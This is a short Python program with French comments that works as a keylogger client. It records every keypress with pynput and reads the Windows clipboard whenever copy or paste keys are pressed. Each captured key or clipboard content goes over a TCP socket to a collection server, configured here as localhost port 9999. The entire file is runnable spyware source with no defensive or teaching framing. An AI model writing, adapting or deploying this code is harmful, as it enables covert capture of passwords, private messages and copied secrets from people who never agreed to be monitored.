from pynput.keyboard import Key, Listener
import socket
import win32clipboard

server_ip = 'localhost'
server_port = 9999

def send(data):
    """
        Envoi les données au serveur
        Si le client n'arrive pas à joindre le serveur, il quittera le programme.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        server.connect((server_ip, server_port))
        server.send(str.encode(data))
        response = server.recv(9999999)
        return response
    except:
        exit()


def retrieve_clipboard():
    """
        Récupère les données dans le presse papier Windows.
    """
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return data

def on_press(key):

    format_key = str(key)
    format_key = format_key.replace('\'','')
    
    if format_key == "Key.space":
        format_key = " "

    elif format_key == "Key.enter":
        format_key = "\n"

    elif format_key.startswith('Key'):
        format_key = format_key.replace('Key.','[')
        format_key += ']'

    elif format_key == r'\x03':
        format_key = retrieve_clipboard()
        
    elif format_key == r'\x16':
        format_key = retrieve_clipboard()
    
    else:
        format_key = format_key
    
    send(format_key)

with Listener(on_press=on_press) as listener:
    """
        Défini l'action à effectuer lorsqu'une touche est pressée.
    """
    listener.join()